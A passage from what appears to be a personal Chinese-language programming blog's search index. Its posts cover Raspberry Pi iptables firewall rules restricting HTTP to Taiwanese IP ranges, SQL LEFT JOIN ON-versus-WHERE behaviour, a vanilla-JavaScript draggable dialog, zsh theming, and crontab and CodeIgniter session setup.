target=\"_blank\" rel=\"noopener\">https://jsfiddle.net/nickday/fayzaew2/11/?utm_source=website&amp;utm_medium=embed&amp;utm_campaign=fayzaew2</a></p>\n","categories":["CSS"],"tags":["flex","float"]},{"title":"Raspberry PI 防火牆設定iptables","url":"/blog/2017/07/09/logdown/2017-07-09-raspberry-pi-set-firewall-iptables/","content":"<p>我的動物機設定，因為公司要報告<br>我使用reveal-md來報告<br>需要連回家裡電腦設定<br>因為之前沒有做記錄<br>就閱在做一下嘍:)<br><a id=\"more\"></a><br>非中華電信網路封鎖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">iptables -F  //清除所有的已訂定的規則；</span><br><span class=\"line\">iptables -P INPUT DROP  //進來的封包全擋</span><br><span class=\"line\">iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class=\"line\"># 選項與參數：</span><br><span class=\"line\"># -m ：一些 iptables 的外掛模組，主要常見的有：</span><br><span class=\"line\">#      state ：狀態模組</span><br><span class=\"line\">#      mac   ：網路卡硬體位址 (hardware address)</span><br><span class=\"line\"># --state ：一些封包的狀態，主要有：</span><br><span class=\"line\">#      INVALID    ：無效的封包，例如資料破損的封包狀態</span><br><span class=\"line\">#      ESTABLISHED：已經連線成功的連線狀態；</span><br><span class=\"line\">#      NEW        ：想要新建立連線的封包狀態；</span><br><span class=\"line\">#      RELATED    ：這個最常用！表示這個封包是與我們主機發送出去的封包有關</span><br><span class=\"line\">iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT //內網192.168.1.0網域可以進來</span><br><span class=\"line\">iptables -A INPUT -i lo -j ACCEPT //localhost可以連  -i interface</span><br><span class=\"line\"></span><br><span class=\"line\">#iptables -A INPUT -p tcp –dport 80 -j ACCEPT  //全部可以連</span><br><span class=\"line\"></span><br><span class=\"line\">#taiwan ip input http:80</span><br><span class=\"line\">iptables -A INPUT -s 61.216.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 218.160.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.62.248.0/21 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.20.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.72.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.72.0.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.242.0.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.71.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.75.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 202.39.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 103.25.236.0/22 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 1.160.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.32.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 122.120.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 60.249.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 60.250.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 59.124.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.128.0.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.30.32.0/20 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.217.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.228.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.22.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.21.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.75.0.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.242.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.61.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.74.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.66.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 43.255.92.0/22 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 1.34.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.24.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 118.160.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 122.116.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 125.224.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 60.248.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 175.111.192.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.218.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.220.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.23.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 59.112.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 211.75.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.241.224.0/19 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.59.128.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 210.65.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 203.69.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 36.224.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 111.240.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 118.168.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 122.118.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 125.232.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 168.95.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 59.120.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 218.168.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.224.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 61.70.239.0/24 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#3 ip-prefix split</span><br><span class=\"line\">iptables -A INPUT -s 202.39.0.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 202.39.64.0/19 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.129.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.137.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.141.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.143.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.128.64.0/17 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 220.128.192.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#emonme ip-prefix</span><br><span class=\"line\">iptables -A INPUT -s 211.79.32.0/20 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 221.120.0.0/18 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 221.120.64.0/19 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 116.59.0.0/16 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 114.136.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 111.70.0.0/15 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 111.80.0.0/14 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 223.136.0.0/13 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -s 42.64.0.0/12 -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#tranmission</span><br><span class=\"line\">iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 9091  -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -p tcp --dport 59999:61000 -j ACCEPT</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://crazyduke.blogspot.com/2009/11/iptablesstate.html\" target=\"_blank\" rel=\"noopener\">U型遊樂園–海底兩萬里: 防火牆-iptables的state(3)</a><br><a href=\"https://www.v2ex.com/t/235392\" target=\"_blank\" rel=\"noopener\">iptables 拒绝所有的连接，再指定 ip 连接? - V2EX</a></p>\n","categories":["Linux"],"tags":["Linux","iptables","Raspberry Pi"]},{"title":"SQL好文分享 - 十步完全理解 SQL","url":"/blog/2017/07/10/logdown/2017-07-10-sql-fine-literature-ten-steps-to-fully-understand-the-sql/","content":"<p>今天找SQL 的IN ,EXISTS,=ANY差別找到這篇文章 <a href=\"http://blog.jobbole.com/48369/\" target=\"_blank\" rel=\"noopener\">十步完全理解 SQL</a><br>看了覺得該簡討一下</p>\n<a id=\"more\"></a>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> a <span class=\"keyword\">as</span> named_column</span><br><span class=\"line\"><span class=\"keyword\">from</span> a_form</span><br><span class=\"line\"><span class=\"keyword\">where</span> named_column = <span class=\"string\">'c'</span></span><br></pre></td></tr></table></figure>\n<p>為什麼不能這樣用呢?<br>我之前聽到的是where抓不到這一層的<br>要再包一層才抓的到</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> named_column</span><br><span class=\"line\">(<span class=\"keyword\">select</span> a <span class=\"keyword\">as</span> named_column</span><br><span class=\"line\"><span class=\"keyword\">from</span> a_form</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">where</span> named_column = <span class=\"string\">'c'</span></span><br></pre></td></tr></table></figure>\n<p>直到我看到<code>2、 SQL 的语法并不按照语法顺序执行</code><br>覺得我最基礎關念沒搞清楚(差點要跪鍵盤了….)</p>\n<p>這篇文章真的不錯，值得我記錄<br>不過文章禁止轉載</p>\n<blockquote>\n<p>本文由 伯乐在线 - 水果泡腾片 翻译。未经许可，禁止转载！<br>英文出处： Lukas Eder 。欢迎加入翻译组。<br><a href=\"http://blog.jobbole.com/55086/\" target=\"_blank\" rel=\"noopener\">http://blog.jobbole.com/55086/</a></p>\n</blockquote>\n<p>在此記錄筆記</p>\n<p>這篇看起來也不錯:P<br><a href=\"http://blog.jobbole.com/48369/\" target=\"_blank\" rel=\"noopener\">http://blog.jobbole.com/48369/</a></p>\n","categories":["SQL"],"tags":["sql"]},{"title":"float前面有元素會往下擠","url":"/blog/2017/07/06/logdown/2017-07-06-2017945/","content":"<p><a href=\"http://div.io/topic/1278\" target=\"_blank\" rel=\"noopener\">http://div.io/topic/1278</a><br><a href=\"https://codepen.io/malagege/pen/wexXwv?editors=0100\" target=\"_blank\" rel=\"noopener\">https://codepen.io/malagege/pen/wexXwv?editors=0100</a></p>\n","categories":["CSS"],"tags":["CSS","float"]},{"title":"SQL ON /WHERE差別","url":"/blog/2017/07/13/logdown/2017-07-13-2043738/","content":"<p>最近在 left join 使用 on 做篩選<br>結果出來跟我想要的不太一樣<br>後來有爬文找到原因</p>\n<a id=\"more\"></a>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">from a left join b on a.id=b.id and b.word = 'xxxx'</span><br></pre></td></tr></table></figure>\n<p>結果跑出來東西是多筆</p>\n<blockquote>\n<p>其實以上結果的關鍵原因就是 left join,right join,full join 的特殊性，不管 on 上的條件是否為真都會返回 left 或 right 表中的記錄，full 則具有 left 和 right 的特性的並集。 而 inner join 沒這個特殊性，則條件放在 on 中和 where 中，返回的結果集是相同的。<br><a href=\"http://blog.sina.com.cn/s/blog_6826662b0101atu1.html\" target=\"_blank\" rel=\"noopener\">http://blog.sina.com.cn/s/blog_6826662b0101atu1.html</a></p>\n</blockquote>\n<p><a href=\"http://louis176127.pixnet.net/blog/post/186150706-sql-%E6%A2%9D%E4%BB%B6%E5%BC%8F%E5%AF%AB%E5%9C%A8on%E4%BB%A5%E5%8F%8Awhere%E7%9A%84%E5%B7%AE%E5%88%A5\" target=\"_blank\" rel=\"noopener\">http://louis176127.pixnet.net/blog/post/186150706-sql-%E6%A2%9D%E4%BB%B6%E5%BC%8F%E5%AF%AB%E5%9C%A8on%E4%BB%A5%E5%8F%8Awhere%E7%9A%84%E5%B7%AE%E5%88%A5</a></p>\n<p><strong>2018-12-24</strong><br>子查詢 join 無法抓到外面的表<br><a href=\"https://malagege.github.io/blog/2018/12/24/%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8/\">終於知道為什麼子查詢沒辦法抓取外面的表 | 程式狂想筆記</a></p>\n<p><strong>2018-12-25</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span></span><br><span class=\"line\">                      xxx,ooo</span><br><span class=\"line\">                    <span class=\"keyword\">FROM</span> table1 ous</span><br><span class=\"line\">                      <span class=\"keyword\">LEFT</span> <span class=\"keyword\">JOIN</span> table2 vc</span><br><span class=\"line\">                        <span class=\"keyword\">ON</span>  vc.user_id = <span class=\"string\">'dddddd'</span></span><br><span class=\"line\">                        <span class=\"keyword\">AND</span> vc.type = <span class=\"string\">'ADD'</span></span><br><span class=\"line\">                        <span class=\"keyword\">AND</span> vc.cancel <span class=\"keyword\">IS</span> <span class=\"literal\">NULL</span></span><br><span class=\"line\"><span class=\"keyword\">AND</span> <span class=\"keyword\">DATE_FORMAT</span>(vc.end_date, <span class=\"string\">'%Y-%m-%d'</span>) &gt;= <span class=\"keyword\">DATE_FORMAT</span>(<span class=\"string\">'2018-01-01'</span>, <span class=\"string\">'%Y-%m-%d'</span>) <span class=\"keyword\">AND</span> <span class=\"keyword\">DATE_FORMAT</span>(START_DATE, <span class=\"string\">'%Y-%m-%d'</span>) &lt; <span class=\"keyword\">DATE_FORMAT</span>(<span class=\"string\">'2018-11-02'</span> , <span class=\"string\">'%Y-%m-%d'</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">WHERE</span>  ous.uid = <span class=\"string\">'dddddd'</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> vc.sid <span class=\"keyword\">DESC</span> <span class=\"keyword\">LIMIT</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>移至 WHERE 結果是不一樣的!!!<br>因為是 LEFT JOIN<br>所以 ous 不管做甚麼條件，都不會消失<br>vc 會變成 null</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span></span><br><span class=\"line\">                      xxx,ooo</span><br><span class=\"line\">                    <span class=\"keyword\">FROM</span> table1 ous</span><br><span class=\"line\">                      <span class=\"keyword\">LEFT</span> <span class=\"keyword\">JOIN</span> table2 vc</span><br><span class=\"line\">                        <span class=\"keyword\">ON</span>  vc.user_id = <span class=\"string\">'dddddd'</span></span><br><span class=\"line\">                        <span class=\"keyword\">AND</span> vc.type = <span class=\"string\">'ADD'</span></span><br><span class=\"line\">                        <span class=\"keyword\">AND</span> vc.cancel <span class=\"keyword\">IS</span> <span class=\"literal\">NULL</span></span><br><span class=\"line\">                    <span class=\"keyword\">WHERE</span>  ous.uid = <span class=\"string\">'dddddd'</span></span><br><span class=\"line\"><span class=\"keyword\">AND</span> <span class=\"keyword\">DATE_FORMAT</span>(vc.end_date, <span class=\"string\">'%Y-%m-%d'</span>) &gt;= <span class=\"keyword\">DATE_FORMAT</span>(<span class=\"string\">'2018-01-01'</span>, <span class=\"string\">'%Y-%m-%d'</span>) <span class=\"keyword\">AND</span> <span class=\"keyword\">DATE_FORMAT</span>(START_DATE, <span class=\"string\">'%Y-%m-%d'</span>) &lt; <span class=\"keyword\">DATE_FORMAT</span>(<span class=\"string\">'2018-11-02'</span> , <span class=\"string\">'%Y-%m-%d'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> vc.sid <span class=\"keyword\">DESC</span> <span class=\"keyword\">LIMIT</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>要改成</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span></span><br><span class=\"line\">                      xxx,ooo</span><br><span class=\"line\">                    <span class=\"keyword\">FROM</span> table1 ous</span><br><span class=\"line\">                      <span class=\"keyword\">LEFT</span> <span class=\"keyword\">JOIN</span> table2 vc</span><br><span class=\"line\">                        <span class=\"keyword\">ON</span>  vc.user_id = <span class=\"string\">'dddddd'</span></span><br><span class=\"line\">                        <span class=\"keyword\">AND</span> vc.type = <span class=\"string\">'ADD'</span></span><br><span class=\"line\">                        <span class=\"keyword\">AND</span> vc.cancel <span class=\"keyword\">IS</span> <span class=\"literal\">NULL</span></span><br><span class=\"line\">                    <span class=\"keyword\">WHERE</span>  ous.uid = <span class=\"string\">'dddddd'</span></span><br><span class=\"line\"><span class=\"keyword\">OR</span> (  ous.uid = <span class=\"string\">'dddddd'</span> <span class=\"keyword\">AND</span> <span class=\"keyword\">DATE_FORMAT</span>(vc.end_date, <span class=\"string\">'%Y-%m-%d'</span>) &gt;= <span class=\"keyword\">DATE_FORMAT</span>(<span class=\"string\">'2018-01-01'</span>, <span class=\"string\">'%Y-%m-%d'</span>) <span class=\"keyword\">AND</span> <span class=\"keyword\">DATE_FORMAT</span>(START_DATE, <span class=\"string\">'%Y-%m-%d'</span>) &lt; <span class=\"keyword\">DATE_FORMAT</span>(<span class=\"string\">'2018-11-02'</span> , <span class=\"string\">'%Y-%m-%d'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> vc.sid <span class=\"keyword\">DESC</span> <span class=\"keyword\">LIMIT</span> <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n","categories":["SQL"],"tags":["sql"]},{"title":"簡單玩了一下拖拉窗視","url":"/blog/2017/07/16/logdown/2017-07-16-2052650/","content":"<p>這一篇只是程式記錄，沒有完成非常大的東西…</p>\n<a id=\"more\"></a>\n<p>最近想手動做個拖拉功能<br>不太想用jQuery UI套Dialog上去<br>有參考<a href=\"https://www.youtube.com/watch?v=xOAHnDsd2BQ\" target=\"_blank\" rel=\"noopener\">來做換色與快速整理的便利貼牆吧！</a>這個教學方法</p>\n<p>不過想自己試試純JS做出來<br>後來移動出問題，解不出來<br>Google一下有看到有人寫一隻<br><a href=\"http://jsgears.com/thread-693-1-1.html\" target=\"_blank\" rel=\"noopener\">多個DIV共用自由移動DIV的程式</a><br>有遇到幾個問題，在此記錄</p>\n<p><a href=\"http://jsbin.com/qexuvawolo/edit?js,output\" target=\"_blank\" rel=\"noopener\">http://jsbin.com/qexuvawolo/edit?js,output</a><br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> top1=<span class=\"number\">0</span>,left1=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> moveFunction = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'x='</span>,event.clientX);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'y='</span>,event.clientY);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'ox='</span>,event.offsetX);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'oy='</span>,event.offsetY);</span><br><span class=\"line\">    <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'dialog'</span>).style.top =  event.clientY - top1+ <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\">     <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'dialog'</span>).style.left = event.clientX - left1 + <span class=\"string\">\"px\"</span>;</span><br><span class=\"line\"> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> mousedownFunction = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">event</span>)</span>&#123;</span><br><span class=\"line\">  top1 = event.offsetX;  <span class=\"comment\">//event.clientY - obj.offsetTop</span></span><br><span class=\"line\">  left1 = event.offsetY; <span class=\"comment\">//event.clientX - obj.offsetLeft</span></span><br><span class=\"line\">  <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'dialog'</span>).addEventListener(<span class=\"string\">'mousemove'</span>,moveFunction);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'dialog'</span>).addEventListener(<span class=\"string\">'mousedown'</span>,mousedownFunction);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'dialog'</span>).addEventListener(<span class=\"string\">'mouseup'</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'dialog'</span>).removeEventListener(<span class=\"string\">'mousemove'</span>,moveFunction);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://jsbin.com/qexuvawolo/edit?js,output\" target=\"_blank\" rel=\"noopener\">http://jsbin.com/qexuvawolo/edit?js,output</a></p>\n<ol>\n<li><p>mousedown記錄點擊位置到物件top,left之間距離<br><img src=\"http://i.imgur.com/SfX48vm.png\" alt=\"\"><br>這部份我想了很久，繪了簡單的圖</p>\n</li>\n<li><p>mousemover設定移動位置(新的Event.ClinetX位置-mousedown的left位置)</p>\n</li>\n<li><p>mouseup取消移動的監聽事件</p>\n</li>\n</ol>\n<p>當然我這個method還無法模組化…，有空在把他改的比較好看<br>上面找的範例他把document.mousemove做全域使用<br>這樣移出body視窗，不會有問題</p>\n<p>可能我也要好好想一下，怎麼寫會比較好</p>\n<hr>\n<p>順便記錄一下別的東西<br><img src=\"http://i.imgur.com/1knHfli.jpg\" alt=\"\"></p>\n<p>event.screenX,event.screenY  從螢幕到event距離<br>event.clientX,event.clientY(event.pageX,event.pageY)  瀏覽器窗口到event距離<br>event.offsetX,event.offsetY    目前物件到event距離</p>\n<p>最後，之後再想想做放大縮小要怎麼做:)</p>\n","categories":["JavaScript"],"tags":["JavaScript"]},{"title":"好看的bash工具 -zsh","url":"/blog/2017/07/18/logdown/2017-07-18-2067199/","content":"<p>之前在MAC看到很多很旋的命令提示字元<br>想說Window沒有這個命<br>結果今天聽同事說Window也能用<br>就馬上試了一下，記錄下來XD</p>\n<a id=\"more\"></a>\n<p>安裝babun，主要裡的zsh是我們要的XD<br>安裝完，遇設主題都幫我們裝好了<br>輸入<code>vim ~/.zshrc</code></p>\n<p>修改<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ZSH_THEME=&quot;agnoster&quot;</span><br></pre></td></tr></table></figure></p>\n<p>重啟zsh就正常了，什麼zsh亂碼</p>\n<p>有試著裝powerline字型都失敗<br>後來同事推薦hack字型</p>\n<p>修改zsh字型就正常了:D</p>\n<p>20170724 有些符號還是沒法出來<br>後來試了這個，成功出來了！<br><a href=\"https://github.com/powerline/fonts/blob/master/DejaVuSansMono/DejaVu%20Sans%20Mono%20for%20Powerline.ttf\" target=\"_blank\" rel=\"noopener\">https://github.com/powerline/fonts/blob/master/DejaVuSansMono/DejaVu%20Sans%20Mono%20for%20Powerline.ttf</a></p>\n","categories":["實用工具"],"tags":["Linux","zsh"]},{"title":"Crontab排程設定","url":"/blog/2017/08/02/logdown/2017-08-02-2131881/","content":"<p>最近想自動建立年月份資料夾<br>雖然<code>crontab -e</code>和<code>crontab -l</code>指令還記得<br>不過設定都會忘記XD<br>再此筆記</p>\n<a id=\"more\"></a>\n<p>每季新番我都要在transmission建立資料夾<br>建久了就想自動化</p>\n<p>首先，先查要怎麼新增當下<code>年月資料夾</code><br>我知道Linux的<code>date</code>可以看時間<br><a href=\"http://yuanann.pixnet.net/blog/post/13384335-linux-%3Adate-%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95\" target=\"_blank\" rel=\"noopener\">http://yuanann.pixnet.net/blog/post/13384335-linux-%3Adate-%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95</a><br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir `date <span class=\"string\">\"+%Y%m\"</span>`</span><br></pre></td></tr></table></figure></p>\n<p>`這個就可以了，Ruby也是這樣設定</p>\n<p>怎麼使用別的使用者執行呢?</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo -u debian-transmission crontab -e</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://linux.vbird.org/linux_basic/0430cron.php#crontab\" target=\"_blank\" rel=\"noopener\">http://linux.vbird.org/linux_basic/0430cron.php#crontab</a></p>\n<p>重點我每次都會忘Crontab內容怎麼設定XD<br>看了設定也有點不安…<br>不過我想到Regex都有Online線上測試<br>不知道Crontab也有沒有XD<br>(之前有悲劇每秒執行程式 囧)</p>\n<p><a href=\"https://crontab.guru/\" target=\"_blank\" rel=\"noopener\">https://crontab.guru/</a><br><a href=\"http://cron.schlitt.info/\" target=\"_blank\" rel=\"noopener\">http://cron.schlitt.info/</a></p>\n<p>有了這個真的方便多了:P</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">0 1 1 1,4,7,11 * mkdir `date &quot;+%Y%m&quot;`</span><br></pre></td></tr></table></figure>\n<p>參考來源：<br><a href=\"https://coder.tw/?p=7284\" target=\"_blank\" rel=\"noopener\">https://coder.tw/?p=7284</a><br><a href=\"http://linux.vbird.org/linux_basic/0430cron.php#crontab\" target=\"_blank\" rel=\"noopener\">http://linux.vbird.org/linux_basic/0430cron.php#crontab</a><br><a href=\"http://yuanann.pixnet.net/blog/post/13384335-linux-%3Adate-%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95\" target=\"_blank\" rel=\"noopener\">http://yuanann.pixnet.net/blog/post/13384335-linux-%3Adate-%E6%8C%87%E4%BB%A4%E7%94%A8%E6%B3%95</a></p>\n","categories":["Linux"],"tags":["Linux","Crontab"]},{"title":"zsh前面「使用者@電腦」拿掉","url":"/blog/2017/07/26/logdown/2017-07-26-2086815/","content":"<p>在.zshrc加入<br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> DEFAULT_USER=`whoami`</span><br></pre></td></tr></table></figure></p>\n<p>完成</p>\n<p>ubuntu 安裝字型<br>apt-get install powerline</p>\n","categories":["Linux"],"tags":["Linux","zsh"]},{"title":"CodeIgniter Session錯誤問題","url":"/blog/2017/06/02/logdown/2017-06-02-codeigniter-session-error-problems/","content":"<p>在config設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$config[&apos;sess_save_path&apos;] =BASEPATH.&apos;../&apos;.&apos;session_file&apos;;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://codeigniter.org.cn/forums/thread-21295-1-1.html\" target=\"_blank\" 